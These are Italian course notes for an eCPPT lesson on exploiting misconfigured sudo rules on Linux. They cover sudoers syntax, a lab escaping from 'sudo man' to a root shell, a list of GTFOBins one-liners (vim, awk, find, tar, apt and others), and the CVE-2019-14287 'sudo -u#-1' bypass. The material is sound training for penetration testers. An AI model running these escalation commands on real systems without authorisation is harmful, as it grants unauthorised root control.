# 017 — Misconfigured SUDO Privileges (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 17/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [017_ Misconfigured SUDO Privileges.txt](017_ Misconfigured SUDO Privileges.txt) · [017_ Misconfigured SUDO Privileges.srt](017_ Misconfigured SUDO Privileges.srt)

## Concetti chiave

- **`sudo`** permette di eseguire comandi come un altro utente (di default `root`), regolato da `/etc/sudoers`.
- Una **misconfigurazione comune**: un utente low-priv può eseguire un binario "innocuo" (es. `man`, `vim`, `awk`, `less`, `find`) con `sudo`. Se quel binario consente una **shell escape**, il risultato è una **root shell**.
- Comando di enumerazione fondamentale: **`sudo -l`** (lista i privilegi sudo dell'utente corrente).
- Sfruttamento via **GTFOBins** sezione *Sudo*: per ogni binario indica esattamente come ottenere shell quando è permesso via sudo.
- Lab: `student` può eseguire `sudo man` senza password (`NOPASSWD`). Su GTFOBins → `sudo man man` poi `!/bin/sh` dentro il pager → root.

## Spiegazione approfondita

### Sintassi `/etc/sudoers`

```
user  host=(runas_user:runas_group)  [tag:]  command
```

Esempi:
```
root     ALL=(ALL:ALL) ALL
student  ALL=(ALL) NOPASSWD: /usr/bin/man
%admin   ALL=(ALL) NOPASSWD: ALL
```

- `NOPASSWD:` = no password richiesta → ideale per attaccante (no creds).
- `ALL` come comando = jackpot (qualsiasi cosa come root).
- Comando specifico (es. `/usr/bin/man`) = bisogna trovare la shell escape di quel binario.

### Metodologia di sfruttamento (3 step)

1. **Enum**: `sudo -l` per vedere cosa puoi eseguire come root.
2. **Lookup**: cerca il binario su [GTFOBins](https://gtfobins.github.io) → sezione **Sudo**.
3. **Exploit**: copia-incolla la one-liner. Se serve, modifica per il path assoluto richiesto da sudoers.

### Flusso del lab — `man` via sudo

1. **Enum**:
   ```bash
   sudo -l
   # User student may run the following commands on this host:
   #     (root) NOPASSWD: /usr/bin/man
   ```
2. **GTFOBins → `man` → Sudo**:
   > If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
   ```
   sudo man man
   !/bin/sh
   ```
3. **Exploit**:
   ```bash
   sudo man man
   # dentro il pager (less):
   !/bin/sh
   # → # id → uid=0(root)
   ```
   Funziona perché `man` apre il contenuto in `less` (o `more`), che ha la feature `!cmd` per eseguire shell command **ereditando l'EUID** del processo padre (root, grazie a sudo).

### Cosa cercare in `sudo -l`

| Pattern | Severità | Tecnica |
|---|---|---|
| `(ALL) NOPASSWD: ALL` | Game over | `sudo -i` o `sudo /bin/bash` |
| `(ALL) ALL` | High (serve pass user) | Stesso, ma chiede password student |
| `NOPASSWD: /usr/bin/<binario>` | Variabile | GTFOBins su quel binario |
| `env_keep+=LD_PRELOAD` | High | **Vedi video 018** — Shared Library Injection |
| `env_keep+=PYTHONPATH` | High | Python library hijack |
| Comando con wildcard `*` | High | Argument injection |
| Path NON assoluto (es. `vim`) | High | PATH hijacking |

### Esempi GTFOBins di sudo escape

```bash
sudo vim -c ':!/bin/sh'                          # vim
sudo awk 'BEGIN {system("/bin/sh")}'             # awk
sudo find . -exec /bin/sh \; -quit               # find
sudo less /etc/profile                           # poi !sh dentro
sudo nmap --interactive                          # poi !sh (vecchio nmap)
sudo perl -e 'exec "/bin/sh";'                   # perl
sudo python -c 'import os; os.system("/bin/sh")' # python
sudo tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/bin/sh   # tar
sudo wget --use-askpass=/tmp/evil.sh /            # wget askpass hijack
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh  # apt
```

### CVE storici da ricordare

- **CVE-2019-14287** (sudo < 1.8.28): se sudoers permette `(ALL, !root)` (tutti tranne root), si bypassa con `sudo -u#-1` o `sudo -u#4294967295` → eseguito come UID 0 (root).
  ```bash
  sudo -u#-1 /bin/bash
  ```
- **CVE-2021-3156 (Baron Samedit)**: heap overflow in sudo (< 1.9.5p2), local privesc senza essere in sudoers. Exploit pubblico.
- **CVE-2021-3560 (Polkit)**: pkexec local privesc (correlato, non sudo strict).

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `sudo -l` | Lista privilegi sudo dell'utente | Step 1 sempre |
| `sudo -ll` | Lista verbose (utile per opzioni come env_keep) | |
| `sudo -V` | Versione sudo (per check CVE) | < 1.8.28 = CVE-2019-14287 |
| `sudo man man` → `!/bin/sh` | Exploit del lab | |
| `sudo -u#-1 /bin/bash` | CVE-2019-14287 | Se applicabile |
| `cat /etc/sudoers` | Solo se readable | Di solito 440 root:root |
| `ls -la /etc/sudoers.d/` | Include file aggiuntivi | Spesso dimenticati |
| **GTFOBins** sezione *Sudo* | Catalogo shell escape | `gtfobins.github.io` |
| **LinPEAS** | Sezione "Sudo & PolicyKit" | Auto-discovery |
| **sudo-killer** | Tool dedicato alla discovery di misconfig sudo | https://github.com/TH3xACE/SUDO_KILLER |

## Esempi pratici

```bash
# 1. Enum
sudo -l
# (root) NOPASSWD: /usr/bin/man

# 2. Lookup su GTFOBins → man → Sudo
#    sudo man man
#    !/bin/sh

# 3. Exploit
sudo man man
# dentro il pager:
!/bin/sh
# # id
# uid=0(root) gid=0(root) groups=0(root)
```

```bash
# Casi tipici GTFOBins
sudo vim -c ':!/bin/sh'
sudo find /etc/passwd -exec /bin/sh \; -quit
sudo awk 'BEGIN{system("/bin/sh")}'
sudo less /etc/profile     # poi !sh

# Variante NOPASSWD: ALL
sudo -i
sudo /bin/bash
```

```bash
# Argument injection (sudo permette tar con args parziali)
# es: sudo /usr/bin/tar *
TF=$(mktemp -u)
sudo tar -cf $TF /tmp \
    --checkpoint=1 \
    --checkpoint-action=exec=/bin/sh
```

## Punti d'attenzione per l'esame eCPPT

- **`sudo -l` è SEMPRE il primo comando** in una macchina Linux compromessa.
- **GTFOBins** è la risorsa #1 — l'esame eCPPT richiede di sapere ALMENO i casi classici a memoria: `vim`, `find`, `awk`, `less`, `man`, `bash`, `python`, `perl`, `tar`.
- Pattern del video: `sudo <pager-like>` → `!cmd` interno = root shell. Vale per `man`, `less`, `more`, `vi`, `vim`, `nano` (limitato).
- **NOPASSWD** = scenario best case per attaccante (no creds richieste).
- **CVE-2019-14287**: ricorda `sudo -u#-1` se vedi sudo vecchio con `!root` nelle regole.
- **`env_keep+=LD_PRELOAD`** in sudo -l → fai il **collegamento immediato** col video 018 (Shared Library Injection).
- Wildcard nei comandi sudoers (`/usr/bin/tar *`) → **argument injection** possibile.
- Path relativi nei sudoers (`vim` invece di `/usr/bin/vim`) → potenzialmente **PATH hijack** (drop di un binario `vim` malevolo in dir scrivibile prima di `/usr/bin` nel `$PATH`).
- Differenza con SUID (video 016): SUID = bit sul file, sempre attivo; sudo = entry sudoers, può richiedere password.

## Collegamenti con altri video

- Precedente: [[016_Exploiting SUID Binaries]] — stessa logica GTFOBins applicata a SUID.
- Prossimo: [[018_ Shared Library Injection]] — exploitation di sudo con `env_keep+=LD_PRELOAD`.
- Discovery automatica: **LinPEAS**, **sudo-killer**.
- Risorsa primaria: [GTFOBins](https://gtfobins.github.io) (sezione *Sudo*).
- MITRE ATT&CK: T1548.003 (Sudo and Sudo Caching).
